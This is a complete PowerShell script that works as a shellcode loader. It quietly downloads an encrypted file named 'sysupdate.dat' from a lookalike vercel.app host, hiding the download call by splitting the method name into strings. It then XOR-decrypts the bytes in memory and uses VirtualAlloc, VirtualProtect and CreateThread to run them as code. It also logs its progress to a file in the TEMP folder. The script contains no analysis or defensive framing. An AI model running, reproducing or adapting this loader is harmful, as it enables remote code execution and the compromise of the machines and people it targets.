$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference = 'SilentlyContinue'

# 1. Fetch Encrypted Shellcode
$base = 'https://site-assetss.vercel.app'
$url = "$base/assets/sysupdate.dat?v=4"

$c = New-Object Net.WebClient
$c.Headers.Add('User-Agent','Mozilla/5.0')
$m = $c.GetType().GetMethod(('{0}{1}' -f 'Down','loadData'))
$bytes = $m.Invoke($c, @($url))

"Downloaded: $($bytes.Length) bytes" | Out-File "$env:TEMP\upd.log" -Append
if ($bytes.Length -eq 0) { exit }

# 2. Decrypt in Memory
for ($i = 0; $i -lt $bytes.Length; $i++) {
    $bytes[$i] = $bytes[$i] -bxor 0x99
}

# 3. Define APIs (Renamed to MemOpV2)
$code = @"
using System;
using System.Runtime.InteropServices;
public class MemOpV2 {
    [DllImport("kernel32", SetLastError=true)] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32", SetLastError=true)] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    [DllImport("kernel32", SetLastError=true)] public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
    [DllImport("kernel32", SetLastError=true)] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    public static string Run(byte[] shellcode) {
        IntPtr ptr = VirtualAlloc(IntPtr.Zero, (UIntPtr)shellcode.Length, 0x3000, 0x04);
        if (ptr == IntPtr.Zero) return "VirtualAlloc failed: " + Marshal.GetLastWin32Error();
        
        Marshal.Copy(shellcode, 0, ptr, shellcode.Length);
        
        uint oldProtect;
        VirtualProtect(ptr, (UIntPtr)shellcode.Length, 0x20, out oldProtect);
        
        IntPtr thread = CreateThread(IntPtr.Zero, 0, ptr, IntPtr.Zero, 0, IntPtr.Zero);
        if (thread == IntPtr.Zero) return "CreateThread failed: " + Marshal.GetLastWin32Error();
        
        WaitForSingleObject(thread, 0xFFFFFFFF);
        return "Success";
    }
}
"@

try {
    Add-Type -TypeDefinition $code -ErrorAction Stop
    "Add-Type succeeded." | Out-File "$env:TEMP\upd.log" -Append
} catch {
    "Add-Type failed: $_" | Out-File "$env:TEMP\upd.log" -Append
    exit
}

# 4. Execute
$result = [MemOpV2]::Run($bytes)
"Execution result: $result" | Out-File "$env:TEMP\upd.log" -Append
